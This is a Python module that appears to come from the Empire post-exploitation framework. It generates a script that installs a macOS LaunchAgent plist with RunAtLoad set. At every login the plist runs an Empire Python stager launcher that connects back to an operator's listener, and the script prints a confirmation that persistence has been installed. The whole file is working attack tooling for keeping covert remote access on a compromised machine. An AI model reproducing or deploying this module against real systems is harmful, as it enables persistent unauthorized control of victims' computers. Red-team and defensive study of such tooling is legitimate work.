from typing import Dict, Optional, Tuple

from empire.server.core.module_models import EmpireModule
from empire.server.utils.string_util import removeprefix, removesuffix


class Module:
    @staticmethod
    def generate(
        main_menu,
        module: EmpireModule,
        params: Dict,
        obfuscate: bool = False,
        obfuscation_command: str = "",
    ) -> Tuple[Optional[str], Optional[str]]:
        plist_name = params["PLISTName"]
        listener_name = params["Listener"]
        user_agent = params["UserAgent"]
        safe_checks = params["SafeChecks"]
        launcher = main_menu.stagers.generate_launcher(
            listener_name,
            language="python",
            userAgent=user_agent,
            safeChecks=safe_checks,
        )
        launcher = removeprefix(launcher, "echo ")
        launcher = removesuffix(launcher, " | python3 &")
        launcher = launcher.strip('"')

        plistSettings = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>{}</string>
<key>ProgramArguments</key>
<array>
<string>python</string>
<string>-c</string>
<string>{}</string>
</array>
<key>RunAtLoad</key>
<true/>
</dict>
</plist>
""".format(
            plist_name,
            launcher,
        )

        script = f"""
import subprocess
import sys
import base64
import os


plistPath = "/Library/LaunchAgents/{plist_name}"

if not os.path.exists(os.path.split(plistPath)[0]):
    os.makedirs(os.path.split(plistPath)[0])

plist = \"\"\"
{plistSettings}
\"\"\"

homedir = os.getenv("HOME")

plistPath = homedir + plistPath

e = open(plistPath,'wb')
e.write(plist)
e.close()

os.chmod(plistPath, 0644)


print("\\n[+] Persistence has been installed: /Library/LaunchAgents/{plist_name}")

"""

        return script
